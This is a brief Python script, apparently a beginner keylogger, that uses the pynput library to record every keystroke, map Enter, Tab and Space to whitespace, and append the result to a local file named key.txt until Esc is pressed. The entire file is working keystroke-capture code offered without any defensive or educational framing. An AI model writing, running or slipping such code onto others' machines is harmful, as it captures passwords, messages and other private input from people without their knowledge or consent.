
from pynput import keyboard


def on_press(key):
    text = ""
    if  key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text =text + str(key).strip("'")
    with open("key.txt", "a+") as file:
            file.write(text)
            print(text)

with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
